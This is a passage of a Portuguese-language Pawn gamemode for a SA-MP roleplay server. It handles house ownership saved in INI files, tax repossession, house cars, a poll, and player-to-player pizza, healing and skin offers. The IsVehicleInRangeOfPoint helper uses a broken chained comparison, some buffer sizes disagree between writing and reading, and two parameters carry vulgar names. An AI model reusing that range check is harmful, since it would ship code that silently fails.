		EmpresaInfo[empresaid][TxTt] = Create3DTextLabel(gstring, -1, Pickupx, Pickupy, Pickupz+0.75, 35.0,0,1);
	}
}

stock CriarCasa(casaid, Float:Pickupx, Float:Pickupy, Float:Pickupz, Float:interiorX, Float:interiorY, Float:interiorZ, Interior, cVenda, cPreco, virtualworld, mapicon)
{
	format(hFile, sizeof(hFile), "Casas/casa%d.ini", casaid);

	if(!fexist(hFile))
	{
	    WE_CreateFile(hFile);
		CasaInfo[casaid][Numero] = casaid;
		format(CasaInfo[casaid][Proprietario], 12, "Ninguem");
		WE_SetString(hFile, "Proprietario", "Ninguem");
		format(CasaInfo[casaid][Morador], 12, "Ninguem");
		WE_SetString(hFile, "Morador", "Ninguem");
 		format(CasaInfo[casaid][Morador2], 12, "Ninguem");
		WE_SetString(hFile, "Morador2", "Ninguem");
  		format(CasaInfo[casaid][Morador3], 12, "Ninguem");
		WE_SetString(hFile, "Morador3", "Ninguem");
		format(CasaInfo[casaid][Login], 12, "00/00/0000");
		WE_SetString(hFile, "Login", "00/00/0000");
		format(CasaInfo[casaid][Mensagem], 12, "Nada");
		WE_SetString(hFile, "Horario", "00:00:00");
		format(CasaInfo[casaid][Horario], 12, "00:00:00");
		WE_SetString(hFile, "Mensagem", "Nada");
		CasaInfo[casaid][PickupX] = Pickupx;
		CasaInfo[casaid][PickupY] = Pickupy;
		CasaInfo[casaid][PickupZ] = Pickupz;
		CasaInfo[casaid][InteriorX] = interiorX;
		CasaInfo[casaid][InteriorY] = interiorY;
		CasaInfo[casaid][InteriorZ] = interiorZ;
		CasaInfo[casaid][InteriorID] = Interior;
		CasaInfo[casaid][Venda] = cVenda;
		CasaInfo[casaid][Preco] = cPreco;
		CasaInfo[casaid][VirtualWorld] = virtualworld;
		CasaInfo[casaid][Status] = 0;
        CasaInfo[casaid][MapIcon] = mapicon;
		WE_SetInt(hFile, "Numero", casaid);
		WE_SetFloat(hFile, "InteriorX", interiorX);
		WE_SetFloat(hFile, "InteriorY", interiorY);
		WE_SetFloat(hFile, "InteriorZ", interiorZ);
		WE_SetInt(hFile, "Interior", Interior);
		WE_SetInt(hFile, "Venda", cVenda);
		WE_SetInt(hFile, "Valor", cPreco);
		WE_SetInt(hFile, "VirtualWorld", virtualworld);
		WE_SetInt(hFile, "Dono", 0);
		WE_SetInt(hFile, "Status", 0);
        WE_SetInt(hFile, "MapIcon", mapicon);
        WE_SetFloat(hFile, "X", Pickupx);
        WE_SetFloat(hFile, "Y", Pickupy);
        WE_SetFloat(hFile, "Z", Pickupz);
        WE_SetInt(hFile, "vLiberado", 0);
        WE_SetInt(hFile, "vM1", 0);
        WE_SetInt(hFile, "vM2", 0);
        WE_SetInt(hFile, "vM3", 0);
        WE_SetInt(hFile, "useCar", 0);
        printf("================[CASA %d CRIADA]================", casaid);
        printf("_ Casa %d criada com sucesso!", casaid);
        printf("================[CASA %d CRIADA]================", casaid);
	}
	else
	{
	    format(CasaInfo[casaid][Proprietario], 24, WE_GetString(hFile, "Proprietario"));
	    format(CasaInfo[casaid][Morador], 24, WE_GetString(hFile, "Morador"));
	    format(CasaInfo[casaid][Morador2], 24, WE_GetString(hFile, "Morador2"));
	    format(CasaInfo[casaid][Morador3], 24, WE_GetString(hFile, "Morador3"));
	    format(CasaInfo[casaid][Mensagem], 64, WE_GetString(hFile, "Mensagem"));
	    format(CasaInfo[casaid][Horario], 12, WE_GetString(hFile, "Horario"));
	    format(CasaInfo[casaid][Login], 12, WE_GetString(hFile, "Login"));
		CasaInfo[casaid][Numero] = WE_GetInt(hFile, "Numero");
		CasaInfo[casaid][Venda] = WE_GetInt(hFile, "Venda");
		CasaInfo[casaid][Preco] = WE_GetInt(hFile, "Valor");
		CasaInfo[casaid][Status] = WE_GetInt(hFile, "Status");
		CasaInfo[casaid][InteriorID] = WE_GetInt(hFile, "Interior");
		CasaInfo[casaid][InteriorX] = WE_GetFloat(hFile, "InteriorX");
		CasaInfo[casaid][InteriorY] = WE_GetFloat(hFile, "InteriorY");
		CasaInfo[casaid][InteriorZ] = WE_GetFloat(hFile, "InteriorZ");
		CasaInfo[casaid][VirtualWorld] = WE_GetInt(hFile, "VirtualWorld");
        CasaInfo[casaid][MapIcon] = WE_GetInt(hFile, "MapIcon");
        CasaInfo[casaid][vLiberado] = WE_GetInt(hFile, "vLiberado");
        CasaInfo[casaid][vM1] = WE_GetInt(hFile, "vM1");
        CasaInfo[casaid][vM2] = WE_GetInt(hFile, "vM2");
        CasaInfo[casaid][vM3] = WE_GetInt(hFile, "vM3");
        WE_SetFloat(hFile, "X", Pickupx);
        WE_SetFloat(hFile, "Y", Pickupy);
        WE_SetFloat(hFile, "Z", Pickupz);
	}
	CasaInfo[casaid][PickupX] = Pickupx;
	CasaInfo[casaid][PickupY] = Pickupy;
	CasaInfo[casaid][PickupZ] = Pickupz;

	if(!strcmp(WE_GetString(hFile, "Proprietario"), "Ninguem", true))
	{
	    CasaPickup[casaid] = CreatePickup(1273, 23, Pickupx, Pickupy, Pickupz);
     	format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {FFFFFF}- {00FF00}Sem dono(a)\n{FFFFFF}/Casa Info", WE_GetInt(hFile, "Numero"));
    	CasaLabel[casaid] = Create3DTextLabel(gStr, COR_BRANCO, Pickupx, Pickupy, Pickupz + 0.75, 20.0,0,1);
	}
	else if(strcmp(WE_GetString(hFile, "Proprietario"), "Ninguem", false))
	{
	    CasaPickup[casaid] = CreatePickup(1272, 23, Pickupx, Pickupy, Pickupz);
    	format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {FFFFFF}- {FF0000}Possui dono(a)\n{FFFFFF}/Casa Info", WE_GetInt(hFile, "Numero"));
    	CasaLabel[casaid] = Create3DTextLabel(gStr, COR_BRANCO, Pickupx, Pickupy, Pickupz + 0.75, 20.0,0,1);
	}
}

forward CasaLiberarPorImpostos(casaid);
public CasaLiberarPorImpostos(casaid)
{
	format(hFile, sizeof(hFile), "Casas/casa%d.ini", casaid);
	format(gFile, sizeof(gFile), "Contas/%s.ini", CasaInfo[casaid][Proprietario]);
	new
		str[256]
	;
	format(str, sizeof(str), "Casa [ID %d] ex-dono(a): %s - Liberada data: %s às %s - Motivo: IMPOSTOS AT", casaid, CasaInfo[casaid][Proprietario], Gdata(), Ghora());
    CasasLiberadas(str);
	format(gstring, sizeof(gstring), "Casa ID {FFFFFF}%d {00FF00}liberada {FF0000}por excesso de dívidas, ex-propietário(a): {FFFFFF}%s", CasaInfo[casaid][Numero], CasaInfo[casaid][Proprietario]);
	SendClientMessageToAll(COR_ERRO, gstring);
	WE_SetInt(gFile, "Casa", -1);
	WE_SetInt(gFile, "Impostos", 0);
	WE_SetInt(gFile, "Atrasados", 0);
	WE_SetInt(gFile, "Spawn", 0);
	new
		strC[128]
	;
	if(strcmp(CasaInfo[casaid][Morador], "Ninguem", false))
	{
		format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[casaid][Morador]);
		WE_SetInt(strC, "MorandoID", -1);
		WE_SetInt(strC, "Spawn", 0);
	}
	if(strcmp(CasaInfo[casaid][Morador2], "Ninguem", false))
	{
		format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[casaid][Morador2]);
		WE_SetInt(strC, "MorandoID", -1);
		WE_SetInt(strC, "Spawn", 0);
	}
	if(strcmp(CasaInfo[casaid][Morador3], "Ninguem", false))
	{
		format(strC, sizeof(strC), "Contas/%s.ini", CasaInfo[casaid][Morador3]);
		WE_SetInt(strC, "MorandoID", -1);
		WE_SetInt(strC, "Spawn", 0);
	}
	DestroyPickup(CasaPickup[casaid]);
	CasaPickup[casaid] = CreatePickup(1273, 23, CasaInfo[casaid][PickupX], CasaInfo[casaid][PickupY], CasaInfo[casaid][PickupZ]);
	format(CasaInfo[casaid][Proprietario], 12, "Ninguem");
	format(CasaInfo[casaid][Morador], 12, "Ninguem");
	format(CasaInfo[casaid][Morador2], 12, "Ninguem");
	format(CasaInfo[casaid][Morador3], 12, "Ninguem");
	format(CasaInfo[casaid][Login], 12, "00/00/0000");
	format(CasaInfo[casaid][Horario], 12, "00:00:00");
	format(CasaInfo[casaid][Mensagem], 6, "Nada");
	CasaInfo[casaid][Status] = 0;
	WE_SetString(hFile, "Proprietario", "Ninguem");
	WE_SetString(hFile, "Morador", "Ninguem");
	WE_SetString(hFile, "Morador2", "Ninguem");
	WE_SetString(hFile, "Morador3", "Ninguem");
	WE_SetString(hFile, "Login", "00/00/0000");
	WE_SetString(hFile, "Horario", "00:00:00");
	WE_SetString(hFile, "Mensagem", "Nada");
	WE_SetString(hFile, "Status", "0");
	WE_SetString(hFile, "Dono", "0");
	WE_SetString(hFile, "vNome", "Veículo Casa");
	WE_SetInt(hFile, "CarModel", 0);
	WE_SetInt(hFile, "Cor1", 0);
	WE_SetInt(hFile, "Cor2", 0);
	cInfo[CasaInfo[casaid][Numero]][CarModel] = 0;
	cInfo[CasaInfo[casaid][Numero]][Cor1] = 0;
	cInfo[CasaInfo[casaid][Numero]][Cor2] = 0;
	Update3DTextLabelText(cInfo[CasaInfo[casaid][Numero]][Label], 0xFFFFFFAA, "   ");
	SetVehicleVirtualWorld(cInfo[CasaInfo[casaid][Numero]][HouseCar], 999);
	format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {FFFFFF}- {00FF00}Sem dono(a)\n{FFFFFF}/Casa Info", CasaInfo[casaid][Numero]);
	Update3DTextLabelText(CasaLabel[casaid], COR_BRANCO, gStr);
}

forward CasasLiberadas(string[]);
public CasasLiberadas(string[])
{
	new File:var_2;
	format(gstring, sizeof(gstring), "%s\r\n", string);
	var_2 = fopen("CasasLiberadas.txt", io_append);
	fwrite(var_2, gstring);
	fclose(var_2);
}

forward LotoGanhadores(string[]);
public LotoGanhadores(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("GanhadoresLoto.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

forward LogPM(string[]);
public LogPM(string[])
{
	new
		var_1[256]
	;
	new
		File:var_2
	;
	format(var_1, sizeof(var_1), "%s\r\n", string);
	var_2 = fopen("LogPM.txt", io_append);
	fwrite(var_2, var_1);
	fclose(var_2);
}

stock CriarVeiculoCasa(casaid, modelid, Float:Carx, Float:Cary, Float:Carz, Float:Angulo, cor1, cor2, respawn)
{
	format(hFile, sizeof(hFile), "Casas/casa%d.ini", casaid);
	if(WE_GetInt(hFile, "useCar") == 0)
	{
	    WE_SetInt(hFile, "useCar", 1);
	}
	if(fexist(hFile))
	{
		if(WE_GetInt(hFile, "CarModel") == 0)
		{
		    WE_SetString(hFile, "vNome", "Veículo Casa");
      		WE_SetInt(hFile, "CarModel", modelid);
		    cInfo[casaid][CarModel] = modelid;
		    cInfo[casaid][CarX] = Carx;
			cInfo[casaid][CarY] = Cary;
			cInfo[casaid][CarZ] = Carz;
			cInfo[casaid][CarAng] = Angulo;
			WE_SetFloat(hFile, "CarX", Carx);
			WE_SetFloat(hFile, "CarY", Cary);
			WE_SetFloat(hFile, "CarZ", Carz);
			WE_SetFloat(hFile, "CarAng", Angulo);
			cInfo[casaid][Cor1] = cor1;
			cInfo[casaid][Cor2] = cor2;
			WE_SetInt(hFile, "Cor1", cor1);
			WE_SetInt(hFile, "Cor2", cor2);
			WE_SetInt(hFile, "Respawn", respawn);
			cInfo[casaid][Respawn] = respawn;
		}
		else
		{
			vHouseRespawn[cInfo[casaid][HouseCar]] = WE_GetInt(hFile, "Respawn");
			if(WE_GetInt(hFile, "newSpawn") == 0)
			{
	  			new
				 	vH_Modelo = WE_GetInt(hFile, "CarModel"),
				  	Float:vH_X = WE_GetFloat(hFile, "CarX"),
					Float:vH_Y = WE_GetFloat(hFile, "CarY"),
					Float:vH_Z = WE_GetFloat(hFile, "CarZ"),
					Float:vH_A = WE_GetFloat(hFile, "CarAng"),
				  	vH_CorID1 = WE_GetInt(hFile, "Cor1"),
					vH_CorID2 = WE_GetInt(hFile, "Cor2"),
				 	vH_Respawn = vHouseRespawn[cInfo[casaid][HouseCar]]
				;
				cInfo[casaid][HouseCar] = CreateVehicle(vH_Modelo, vH_X, vH_Y, vH_Z, vH_A, vH_CorID1, vH_CorID2, vH_Respawn);
	   			new
					color = WE_GetInt(hFile, "vColorID")
				;
			 	cInfo[casaid][Label] = Create3DTextLabel(WE_GetString(hFile, "vNome"), SetVehCorName(color), vH_X, vH_Y, vH_Z, 40.0,0,1);
				Attach3DTextLabelToVehicle(cInfo[casaid][Label], cInfo[casaid][HouseCar], 0.0, -2.5, 0.5);
	    	}
	     	else
			{
	  			new
				 	vH_Modelo = WE_GetInt(hFile, "CarModel"),
				  	Float:vH_X = WE_GetFloat(hFile, "newCarX"),
					Float:vH_Y = WE_GetFloat(hFile, "newCarY"),
					Float:vH_Z = WE_GetFloat(hFile, "newCarZ"),
					Float:vH_A = WE_GetFloat(hFile, "newCarAng"),
				  	vH_CorID1 = WE_GetInt(hFile, "Cor1"),
					vH_CorID2 = WE_GetInt(hFile, "Cor2"),
				 	vH_Respawn = vHouseRespawn[cInfo[casaid][HouseCar]]
				;
				cInfo[casaid][HouseCar] = CreateVehicle(vH_Modelo, vH_X, vH_Y, vH_Z, vH_A, vH_CorID1, vH_CorID2, vH_Respawn);
	   			new
					color = WE_GetInt(hFile, "vColorID")
				;
			 	cInfo[casaid][Label] = Create3DTextLabel(WE_GetString(hFile, "vNome"), SetVehCorName(color), vH_X, vH_Y, vH_Z, 40.0,0,1);
				Attach3DTextLabelToVehicle(cInfo[casaid][Label], cInfo[casaid][HouseCar], 0.0, -2.5, 0.5);
			}
			new
				veh[128]
			;
			format(veh, sizeof(veh), "CarrosTunados/vCasa%d.ini", casaid);
			if(fexist(veh))
			{
		        cInfo[casaid][t_Cor_1] = WE_GetInt(veh, "Cor1");
		        cInfo[casaid][t_Cor_2] = WE_GetInt(veh, "Cor2");
		        cInfo[casaid][t_PaintJob] = WE_GetInt(veh, "PaintJob");
		        cInfo[casaid][t_Nitro] = WE_GetInt(veh, "Nitro");
		        cInfo[casaid][t_Roda] = WE_GetInt(veh, "Roda");
		        cInfo[casaid][t_Spoiler] = WE_GetInt(veh, "Spoiler");
		        cInfo[casaid][t_Hydraulico] = WE_GetInt(veh, "Hydraulico");
				cInfo[casaid][t_ParachoqueDianteiro] = WE_GetInt(veh, "ParachoqueDianteiro");
				cInfo[casaid][t_ParachoqueTraseiro] = WE_GetInt(veh, "ParachoqueTraseiro");
				cInfo[casaid][t_Escapamento] = WE_GetInt(veh, "Escapamento");
				cInfo[casaid][t_Bventr] = WE_GetInt(veh, "Bventr");
				cInfo[casaid][t_Bventl] = WE_GetInt(veh, "Bventl");
				cInfo[casaid][t_Bscoop] = WE_GetInt(veh, "Bscoop");
				cInfo[casaid][t_Rscoop] = WE_GetInt(veh, "Rscoop");
				cInfo[casaid][t_Lskirt] = WE_GetInt(veh, "Lskirt");
				cInfo[casaid][t_Rskirt] = WE_GetInt(veh, "Rskirt");
				cInfo[casaid][t_Base] = WE_GetInt(veh, "Base");
				cInfo[casaid][t_Rbbars] = WE_GetInt(veh, "Rbbars");
				cInfo[casaid][t_Fbbars] = WE_GetInt(veh, "Fbbars");
				cInfo[casaid][t_Lights] = WE_GetInt(veh, "Lights");
	        }
			SetVehicleToRespawn(cInfo[casaid][HouseCar]);
			vHouse[cInfo[casaid][HouseCar]] = 1;
		}
	}
}

forward NewCarH(casaid);
public NewCarH(casaid)
{
	format(hFile, sizeof(hFile), "Casas/casa%d.ini", casaid);
	if(cInfo[casaid][NewCar] == 1)
	{
        cInfo[casaid][NewCar] = 0;
        Delete3DTextLabel(cInfo[casaid][Label]);
        DestroyVehicle(cInfo[casaid][HouseCar]);
 		new
			color = WE_GetInt(hFile, "vColorID")
		;
		if(WE_GetInt(hFile, "newSpawn") == 0)
		{
	  		cInfo[casaid][HouseCar] = CreateVehicle(WE_GetInt(hFile, "CarModel"), WE_GetFloat(hFile, "CarX"), WE_GetFloat(hFile, "CarY"), WE_GetFloat(hFile, "CarZ"), WE_GetFloat(hFile, "CarAng"), WE_GetInt(hFile, "Cor1"), WE_GetInt(hFile, "Cor2"), WE_GetInt(hFile, "Respawn"));
            cInfo[casaid][Label] = Create3DTextLabel(WE_GetString(hFile, "vNome"), SetVehCorName(color), WE_GetFloat(hFile, "CarX"), WE_GetFloat(hFile, "CarY"), WE_GetFloat(hFile, "CarZ"), 40.0,0,1);
		}
	    else
	    {
	  		cInfo[casaid][HouseCar] = CreateVehicle(WE_GetInt(hFile, "CarModel"), WE_GetFloat(hFile, "newCarX"), WE_GetFloat(hFile, "newCarY"), WE_GetFloat(hFile, "newCarZ"), WE_GetFloat(hFile, "newCarAng"), WE_GetInt(hFile, "Cor1"), WE_GetInt(hFile, "Cor2"), WE_GetInt(hFile, "Respawn"));
	  		cInfo[casaid][Label] = Create3DTextLabel(WE_GetString(hFile, "vNome"), SetVehCorName(color), WE_GetFloat(hFile, "newCarX"), WE_GetFloat(hFile, "newCarY"), WE_GetFloat(hFile, "newCarZ"), 40.0,0,1);
		}
		SetVehicleToRespawn(cInfo[casaid][HouseCar]);
		vHouse[cInfo[casaid][HouseCar]] = 1;
		Attach3DTextLabelToVehicle(cInfo[casaid][Label], cInfo[casaid][HouseCar], 0.0, -2.5, 0.5);
	}
}

stock IsValidVehicle(v)
{
    if(GetVehicleModel(v) < 400 || GetVehicleModel(v) > 611) return false;
        else return true;
}

stock SpawnCasa(playerid)
{
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	new
		c = WE_GetInt(gFile, "Casa"), m = WE_GetInt(gFile, "MorandoID")
	;
	if(c > 0)
	{
		if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
		{
			SetPlayerPos(playerid, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]);
			SetPlayerInterior(playerid, 0);
			if(MensagemHouse[playerid] == 0)
			{
				format(gStr, sizeof(gStr), "%s você é proprietário da casa ID %d.", PlayerName(playerid), c);
				SendClientMessage(playerid, AZUL_WE, gStr);
        		MensagemHouse[playerid] = 1;
			}
  			if(IsCasaIlha(c))
			{
				TogglePlayerControllable(playerid, false);
				SetTimerEx("DescongelarIlha", 2000, false, "d", playerid);
				gelarSpawn[playerid] = true;
			}
			format(hFile, sizeof(hFile), "Casas/casa%d.ini", c);

			WE_SetString(hFile, "Login", Gdata());
			format(CasaInfo[c][Login], 12, Gdata());

			WE_SetString(hFile, "Horario", Ghora());
			format(CasaInfo[c][Horario], 12, Ghora());

			return 1;
		}
	}
	else if(m > 0)
	{
		if(!strcmp(CasaInfo[m][Morador], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[m][Morador2], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[m][Morador3], PlayerName(playerid), true))
		{
			SetPlayerPos(playerid, CasaInfo[m][PickupX], CasaInfo[m][PickupY], CasaInfo[m][PickupZ]);
			SetPlayerInterior(playerid, 0);
			if(MensagemHouse[playerid] == 0)
			{
			    format(gStr, sizeof(gStr), "%s a casa ID %d que você mora foi carregada!", PlayerName(playerid), m);
				SendClientMessage(playerid, COR_AMARELO, gStr);
	         	MensagemHouse[playerid] = 1;
			}
   			if(IsCasaIlha(m))
			{
				TogglePlayerControllable(playerid, false);
				SetTimerEx("DescongelarIlha", 2000, false, "d", playerid);
				gelarSpawn[playerid] = true;
			}
		}
	}
	return 0;
}

forward DescongelarIlha(playerid);
public DescongelarIlha(playerid)
{
	TogglePlayerControllable(playerid, true);
	gelarSpawn[playerid] = false;
	new
		c = WE_GetInt(f(playerid), "Casa"), m = WE_GetInt(f(playerid), "MorandoID"), CasaID
	;
	if(c > 0)
	{
	    CasaID = c;
	}
	else if(m > 0)
	{
	    CasaID = m;
	}
  	for(new v = 0; v < MAX_VEHICLES; ++v)
	{
        if(IsVehicleInRangeOfPoint(v, 50.0, CasaInfo[CasaID][PickupX], CasaInfo[CasaID][PickupY], CasaInfo[CasaID][PickupZ]))
		{
			if(!IsVehicleOccupied(v) && NotTrailerAtached(v)) SetVehicleToRespawn(v);
		}
	}
}

stock IsVehicleInRangeOfPoint(vehicleid, Float:range, Float:x, Float:y, Float:z)
{
    static
        Float:pX, Float:pY, Float:pZ;

    GetVehiclePos(vehicleid, pX, pY, pZ);
    return x - range / 2 < pX > x + range / 2 && y - range / 2 < pY > y + range / 2 && z - range / 2 < pZ > z + range / 2;
}

forward TutoLimparChatPlayer(playerid);
public TutoLimparChatPlayer(playerid)
{
	if(NoTuto[playerid] == false)
	{
	    KillTimer(ChatTuto[playerid]);
	}
	else if(NoTuto[playerid] == true)
	{
		LimparChat(playerid, 150);
		ChatTuto[playerid] = SetTimerEx("TutoLimparChatPlayer", 1000, false, "d", playerid);
	}
	return 1;
}

forward Float:GetPlayeyEmpresaDistacia(playerid, XERECATORTA);
public Float:GetPlayeyEmpresaDistacia(playerid, XERECATORTA)
{
	new
		Float:Empresa_x,
		Float:Empresa_y,
		Float:Empresa_z,
		Float:Empresa_xx,
		Float:Empresa_yy,
		Float:Empresa_zz
	;
	GetPlayerPos(playerid, Empresa_x, Empresa_y, Empresa_z);
	Empresa_xx = EmpresaInfo[XERECATORTA][PickupX];
	Empresa_yy = EmpresaInfo[XERECATORTA][PickupY];
	Empresa_zz = EmpresaInfo[XERECATORTA][PickupZ];
	return floatsqroot(floatpower(floatabs(floatsub(Empresa_xx, Empresa_x)), 2)+floatpower(floatabs(floatsub(Empresa_yy, Empresa_y)), 2)+floatpower(floatabs(floatsub(Empresa_zz, Empresa_z)), 2));
}

forward Float:GetPlayeyCasaDistacia(playerid, BUCETA);
public Float:GetPlayeyCasaDistacia(playerid, BUCETA)
{
	new
		Float:Casa_x,
		Float:Casa_y,
		Float:Casa_z,
		Float:Casa_xx,
		Float:Casa_yy,
		Float:Casa_zz
	;
	GetPlayerPos(playerid, Casa_x, Casa_y, Casa_z);
	Casa_xx = CasaInfo[BUCETA][PickupX];
	Casa_yy = CasaInfo[BUCETA][PickupY];
	Casa_zz = CasaInfo[BUCETA][PickupZ];
	return floatsqroot(floatpower(floatabs(floatsub(Casa_xx, Casa_x)), 2)+floatpower(floatabs(floatsub(Casa_yy, Casa_y)), 2)+floatpower(floatabs(floatsub(Casa_zz, Casa_z)), 2));
}

forward RemoveTextDraw();
public RemoveTextDraw()
{
    Anunciado = 0;
	for(new t; t < 4; t++)
	{
		TextDrawHideForAll(TextAnuncio[t]);
	}
	return 1;
}

forward TempoVotacao();
public TempoVotacao()
{
	if(vTempo <= 0)
	{
		SetTimer("enqueteFinalizar", 1000, false);
	}
	else
	{
		new
			votos[1024]
		;
		vTempo --;
		format(votos, sizeof(votos), "~b~~h~Enquete~n~~n~~g~~h~Pergunta: ~w~%s~n~~n~~y~Use: ~w~/Sim ~y~ou ~w~/Nao~n~~n~Votos computados: ~n~> [%d] Sim - [%d] Nao", enquetep, vSim, vNao);
		TextDrawSetString(Enquete, votos);
		format(gstring, sizeof(gstring), "~n~~n~~y~~h~Tempo restante~n~~n~%d", vTempo);
		TextDrawSetString(ContagemEnquete, gstring);
		SetTimer("TempoVotacao", 1000, false);
	}
	return 1;
}

forward enqueteFinalizar();
public enqueteFinalizar()
{
    enquetep = "Nenhuma";
    VotacaoIniciada = 0;
	TextDrawHideForAll(Enquete);
	TextDrawHideForAll(ContagemEnquete);
	SendClientMessageToAll(0x33FF00AA, " [Enquete] ");
	format(gstring, sizeof(gstring), " %d votos a favor (Sim) e %d votos contra (Não).", vSim, vNao);
	SendClientMessageToAll(COR_AMARELO, gstring);
	if(vSim > vNao) { SendClientMessageToAll(0x33CC33AA, " A maior quantia de votos computados é 'Sim'."); }
	if(vSim < vNao) { SendClientMessageToAll(COR_ERRO, " A maior quantia de votos computados é 'Não'."); }
	if(vSim == vNao) { SendClientMessageToAll(0xFFFF33AA, " A enquete empatou, com a mesma quantia de 'Sim' e 'Não'."); }
	SendClientMessageToAll(0x33FF00AA, " [Enquete] ");
	vSim = 0;
	vNao = 0;
	foreach(Player, i)
	{
		Votou[i] = 0;
	}
	return 1;
}

stock RemoveWeaponSlot(playerid, iWeaponSlot)
{
	new weapons[13][2];
    for(new i = 0; i < 13; i++)
        GetPlayerWeaponData(playerid, i, weapons[i][0], weapons[i][1]);

    weapons[iWeaponSlot][0] = 0;

    ResetPlayerWeapons(playerid);

    for(new i = 0; i < 13; i++)
        GivePlayerWeapon(playerid, weapons[i][0], weapons[i][1]);

    return 1;
}

stock GetWeaponSlot(weaponid) // POSTADO POR Hiddos EM  '://forum.sa-mp.com/showpost.php?p=782197&postcount=4'
{
	new slot;
	switch(weaponid)
	{
		case 0,1: slot = 0;
		case 2 .. 9: slot = 1;
		case 10 .. 15: slot = 10;
		case 16 .. 18, 39: slot = 8;
		case 22 .. 24: slot =2;
		case 25 .. 27: slot = 3;
		case 28, 29, 32: slot = 4;
		case 30, 31: slot = 5;
		case 33, 34: slot = 6;
		case 35 .. 38: slot = 7;
		case 40: slot = 12;
		case 41 .. 43: slot = 9;
		case 44 .. 46: slot = 11;
	}
	return slot;
}

stock GetPlayerAmmoFromWeapon(playerid, weaponid)
{
    new
		weapon, ammo
	;
    GetPlayerWeaponData(playerid, GetWeaponSlot(weaponid), weapon, ammo);
    return ammo;
}

forward MsgPizza(playerid);
public MsgPizza(playerid)
{
	if(Pizza_Mensagem[playerid] >= 5)
	{
	    KillTimer(Pizza_Timer[playerid]); KillTimer(Pizza_Timer[Pizza_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta da pizza foi cancelada!", PlayerName(Pizza_PID[playerid]));
		SendClientFormat(Pizza_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		Pizza_Oferecido[Pizza_PID[playerid]] = 0;
		Pizza_IID[Pizza_PID[playerid]] = -1;
		Pizza_Recebido[playerid] = 0;
		Pizza_Mensagem[playerid] = 0;
		Pizza_VALOR[playerid] = 0;
		Pizza_PID[playerid] = -1;
		Pizza_SID[playerid] = 0;
		return 1;
	}
	if(Pizza_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu pra você uma pizza sabor %s por R$%d. (Use: /pAceitar ou /pRecusar)", PlayerName(Pizza_PID[playerid]), PizzaNome(Pizza_SID[playerid]), Pizza_SID[playerid]);
		SendClientFormat(Pizza_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Pizza)", PlayerName(playerid));
		Pizza_Mensagem[playerid] ++;	Pizza_Timer[playerid] = SetTimerEx("MsgPizza", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarPizza(playerid);
public LiberarPizza(playerid)
{
    Pizza_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais pizza.");
	return 1;
}

forward PizzaObjetoff(playerid);
public PizzaObjetoff(playerid)
{
	StopPlayerHoldingObject(playerid);
	return 1;
}

stock PizzaNome(idpizzaid)
{
	new PizaName[24];
	if(idpizzaid == 1)	{	PizaName = "Calabresa";	}
	if(idpizzaid == 2)	{	PizaName = "Mussarela";	}
	if(idpizzaid == 3)	{	PizaName = "Frango com Catupiry";	}
	if(idpizzaid == 4)	{	PizaName = "4 Queijos";	}
	if(idpizzaid == 5)	{	PizaName = "Atum com Mussarela";	}
	return PizaName;
}

forward Curar(playerid);
public Curar(playerid)
{
	if(Cura_Mensagem[playerid] >= 5)
	{
	    KillTimer(Cura_Timer[playerid]); KillTimer(Cura_Timer[Cura_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta da cura foi cancelada!", PlayerName(Cura_PID[playerid]));
		SendClientFormat(Cura_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		Cura_Oferecido[Cura_PID[playerid]] = 0;
		Cura_IID[Cura_PID[playerid]] = -1;
		Cura_Recebido[playerid] = 0;
		Cura_Mensagem[playerid] = 0;
		Cura_VALOR[playerid] = 0;
		Cura_PID[playerid] = -1;
		return 1;
	}
	if(Cura_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu cura pra você por R$%d. (Use: /AccCura ou /RecCura)", PlayerName(Cura_PID[playerid]), Cura_VALOR[playerid]);
		SendClientFormat(Cura_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Cura)", PlayerName(playerid));
		Cura_Mensagem[playerid] ++;	Cura_Timer[playerid] = SetTimerEx("Curar", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarCura(playerid);
public LiberarCura(playerid)
{
    Cura_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais cura.");
	return 1;
}

forward Skin(playerid);
public Skin(playerid)
{
	if(_SKIN_Mensagem[playerid] >= 5)
	{
	    KillTimer(_SKIN_Timer[playerid]); KillTimer(_SKIN_Timer[_SKIN_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta da skin foi cancelada!", PlayerName(_SKIN_PID[playerid]));
		SendClientFormat(_SKIN_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		_SKIN_Oferecido[_SKIN_PID[playerid]] = 0;
		_SKIN_IID[_SKIN_PID[playerid]] = -1;
		_SKIN_Recebido[playerid] = 0;
		_SKIN_Mensagem[playerid] = 0;
		_SKIN_VALOR[playerid] = 0;
		_SKIN_PID[playerid] = -1;
		_SKIN_SID[playerid] = 0;
		return 1;
	}
	if(_SKIN_Mensagem[playerid] < 5)
	{
